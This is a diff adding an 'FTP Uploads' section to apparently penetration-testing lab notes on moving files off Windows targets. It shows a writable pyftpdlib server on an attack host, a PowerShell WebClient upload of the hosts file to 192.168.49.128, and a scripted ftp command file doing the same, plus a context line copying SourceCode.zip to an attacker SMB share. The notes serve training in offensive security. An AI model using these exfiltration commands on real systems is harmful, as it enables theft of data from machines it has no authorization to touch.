@@ -264,6 +264,44 @@ copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
 **NOTE:** If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations
 
 
+### FTP Uploads
+
+- Specify the option --write to allow clients to upload files to our attack host, such as below:
+
+**Uploading Files to FTP**
+```
+sudo python3 -m pyftpdlib --port 21 --write
+```
+
+
+**PowerShell Upload File to FTP**
+```
+PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+```
+
+**Create a Command File for the FTP Client to Upload a File**
+```
+echo open 192.168.49.128 > ftpcommand.txt
+echo USER anonymous >> ftpcommand.txt
+echo binary >> ftpcommand.txt
+echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
+echo bye >> ftpcommand.txt
+```
+
+Now log into the FTP server and get the ftpcommand.txt file
+```
+C:\htb> ftp -v -n -s:ftpcommand.txt
+ftp> open 192.168.49.128
+
+Log in with USER and PASS first.
+
+
+ftp> USER anonymous
+ftp> PUT c:\windows\system32\drivers\etc\hosts
+ftp> bye
+```
+
+
 
 
 
